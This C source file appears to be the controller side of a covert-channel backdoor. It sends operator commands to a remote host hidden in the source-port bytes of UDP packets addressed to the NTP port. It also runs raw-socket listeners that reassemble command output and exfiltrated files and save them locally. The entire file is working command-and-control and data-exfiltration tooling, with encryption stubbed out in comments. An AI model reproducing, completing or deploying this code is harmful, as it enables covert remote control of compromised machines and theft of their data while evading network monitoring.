#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "client.h"
#include "defs.h"
#include "util.h"
#include "ntp.h"
#include "inet.h"

int closing;
int com_chan;
int xfl_chan;

void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan)
{
	char command[MAX_LEN];
	pthread_t list_thread;

	com_chan = cchan;
	xfl_chan = xchan;

	if (ipaddr == 0)
		error("Invalid IP specified.");

	if (!val_port(dport))
		error("Invalid destination port specified.");

	closing = 0;
	pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
	
	printf("Ready, awaiting your command...\n");
	while(fgets(command, MAX_LEN, stdin) != NULL)
	{
		char *trans;
		int tot_len;

		tot_len = strlen(command) + 1;

		trans = buildTransmission(command, &tot_len, CMD_TYP);

		for (int i = 0; i < tot_len; i += 8)
		{
			char frame[FRAM_SZ];
//			char *enc;
			char *ptr;
			int fram_len;
			uint16 src_port = 0;
			uint16 dst_port = 0;

			ptr = trans + i;

			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;

			memcpy(frame, ptr, fram_len);

//			enc = encrypt(SEKRET, frame, FRAM_SZ);

			for (int j = 0; j < FRAM_SZ; ++j)
			{
				uint8 byte = frame[j];
				src_port = 0xFF00 & SIGNTR << 8;
				src_port += byte;
				dst_port = PORT_NTP;

				_send(ipaddr, src_port, dst_port, CHAN_UDP);
				usleep(SLEEP_TIME);
			}

//			free(enc);
		}

		free(trans);
	}	

	// Listen thread cleanup
	closing = 1;
	pthread_join(list_thread, NULL);
//	pthread_join(exfil_thread, NULL);
}

void *listen_thread(void *arg)
{
	int sock;
	static char buf[MAX_LEN];
	static int buf_len = 0;
	uint32 ipaddr = *(uint32*)arg;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sock < 0)
		error("unable to open listening raw socket");

	while(!closing)
	{
		char packet[MAX_LEN];
		char *ptr;
		char *data;
//		char *dec;
		char type;
		int  pack_len;
		uint32 *ip;

		pack_len = read(sock, &packet, MAX_LEN);

		// Step 1: Check for error
		if (pack_len <= 0)
			continue;

		// Step 2: check IP address
		ip = ((uint32*)packet) + 3;
		if (*ip != ipaddr)
			continue;

		// Step 3: dump data into buffer
		ptr = (char *)(packet + IP_LEN);

		// Step 4: check for signature
		if (*ptr == SIGNTR)
			continue;
		
		// Step 5: Point to 2nd Byte
		++ptr;

		// Step 6: Decrypt and extract
//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
		data = buf + buf_len;
		memcpy(data, ptr, 1);
//		free(dec);

		buf_len += 1;

		// Step 7: see if we have a full transmission
		data = getTransmission(buf, &buf_len, &type);
		if (data == NULL)
			continue;

		// Step 8: show the results
		if (type == RSP_TYP)
		{
			printf("Data: %s", data);
		}
		else if (type == XFL_TYP)
		{
			char fname[MAX_LEN];
			FILE* file;
			uint64 timestamp;

			timestamp = get_sec();
			sprintf(fname, "%llX", timestamp);
			file = open_file(fname, TRUE);

			printf("%s", data);
			fwrite(data, buf_len, 1, file);

			fclose(file);
		}

		// Step 9: reset buffer
		memset(buf, 0, MAX_LEN);
		memset(packet, 0, MAX_LEN);
		buf_len = 0;
		free(data);
		data = 0;
	}

	return NULL;
}

int val_port(int port)
{
	if (0 < port && port < 65535)
		return 1;
	else 
		return 0;
}

void* exfil_listen(void *arg)
{
	int sock;
	char buf[MAX_LEN];
	int buf_len = 0;
	uint32 ipaddr = *(uint32*)arg;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sock < 0)
		error("unable to open exfil raw socket");

	while (!closing)
	{
		char packet[MAX_LEN];
		char *ptr;
		char *data;
//		char *dec;
		char type;
		int  pack_len;
		uint32 *ip;

		pack_len = read(sock, &packet, MAX_LEN);

		// Step 1: locate the payload portion of the packet
		if (pack_len <= 0)
			continue;

		// Step 1: check IP address
		ip = ((uint32*)packet) + 3;
		if (*ip != ipaddr)
			continue;

		// Step 2: check for signature

		// Step 3: dump data into buffer
		ptr = (char *)(packet + IP_LEN);
//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
		data = buf + buf_len;
		memcpy(data, ptr, FRAM_SZ);
//		free(dec);

		buf_len += pack_len - IP_LEN;

		// Step 4: see if we have a full transmission
		data = getTransmission(buf, &buf_len, &type);
		if (data == NULL)
			continue;

		if (type == XFL_TYP)
		{
			char fname[MAX_LEN];
			FILE* file;
			uint64 timestamp;

			timestamp = get_sec();
			sprintf(fname, "%llX", timestamp);
			file = open_file(fname, TRUE);

			printf("%s", data);
			fwrite(data, buf_len, 1, file);

			fclose(file);
		}

		free(data);
	}

	close(sock);

	return NULL;
}
